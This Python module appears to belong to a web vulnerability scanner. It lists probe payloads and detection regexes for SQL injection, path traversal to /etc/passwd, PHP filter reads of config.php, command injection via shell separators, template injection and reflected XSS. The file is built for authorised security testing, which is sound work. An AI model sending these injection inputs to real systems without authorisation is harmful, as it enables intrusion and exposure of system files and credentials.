"""Payloads and detection signatures used by the active checks.

Everything here is intentionally non-destructive: probes either trigger an
error, get reflected, read a world-readable file, or evaluate harmless math.
None of them modify data, escalate access, or run harmful commands.
"""

from __future__ import annotations

import re

SQLI_ERROR_PAYLOADS = ["'", '"', "')", "';", "' OR '1"]

SQL_ERROR_SIGNATURES = [
    re.compile(p, re.IGNORECASE)
    for p in [
        r"you have an error in your sql syntax",
        r"warning: mysqli?_",
        r"unclosed quotation mark after the character string",
        r"quoted string not properly terminated",
        r"sqlstate\[",
        r"pg_query\(\)|pg_exec\(\)",
        r"psql: error",
        r"sqlite3?\.(operational|programming)error|sqlite_error",
        r"ora-\d{5}",
        r"microsoft (ole db|odbc) .*?sql server",
        r"odbc sql server driver",
        r"mysql_fetch_(array|assoc|row)\(\)",
        r"supplied argument is not a valid mysql",
        r"npgsql\.",
    ]
]

SQLI_TRUE_PAYLOAD = "' OR '1'='1"
SQLI_FALSE_PAYLOAD = "' AND '1'='2"


def match_sql_error(body: str) -> str:
    if not body:
        return ""
    for sig in SQL_ERROR_SIGNATURES:
        m = sig.search(body)
        if m:
            return m.group(0)
    return ""


def sqli_time_payloads(seconds: int) -> list[str]:
    return [
        f"1' AND SLEEP({seconds})-- -",
        f'1" AND SLEEP({seconds})-- -',
        f"1' AND pg_sleep({seconds})-- -",
        f"1'; WAITFOR DELAY '0:0:{seconds}'-- -",
        f"1) AND SLEEP({seconds})-- -",
    ]


def time_based_triggered(baseline_s: float, delayed_s: float, sleep_s: float) -> bool:
    return baseline_s < sleep_s and (delayed_s - baseline_s) >= sleep_s * 0.7


TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
]

PASSWD_RE = re.compile(r"root:.*?:0:0:")


def match_passwd(body: str) -> str:
    if not body:
        return ""
    m = PASSWD_RE.search(body)
    return m.group(0) if m else ""


LFI_PHP_MARKER = "PD9waHA"

LFI_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../index.php",
]


REDIRECT_PARAM_NAMES = {
    "url", "u", "next", "redirect", "redirect_uri", "redirect_url", "return",
    "returnurl", "return_url", "dest", "destination", "continue", "goto", "to",
    "out", "view", "go", "link", "target",
}


def xss_probe(token: str) -> str:
    return f'wvs{token}"\'><svg/onload=1>'


def xss_reflected_raw(body: str, token: str) -> bool:
    if not body:
        return False
    marker = f"wvs{token}"
    if marker not in body:
        return False
    return f"{marker}\"'><svg/onload=1>" in body or "<svg/onload=1>" in body


def cmdi_payloads(a: int, b: int, left: str, right: str) -> list[str]:
    expr = f"$(({a}*{b}))"
    inner = f"echo {left}{expr}{right}"
    return [
        f"; {inner}",
        f"| {inner}",
        f"& {inner}",
        f"$({inner})",
        f"`{inner}`",
        f"%0a{inner}",
    ]


def cmdi_expected(a: int, b: int, left: str, right: str) -> str:
    return f"{left}{a * b}{right}"


def ssti_payloads(a: int, b: int, left: str, right: str) -> list[str]:
    e = f"{a}*{b}"
    return [
        left + "{{" + e + "}}" + right,
        left + "${" + e + "}" + right,
        left + "#{" + e + "}" + right,
        left + "<%= " + e + " %>" + right,
        left + "{" + e + "}" + right,
        left + "*{" + e + "}" + right,
        left + "${{" + e + "}}" + right,
    ]


def ssti_expected(a: int, b: int, left: str, right: str) -> str:
    return f"{left}{a * b}{right}"
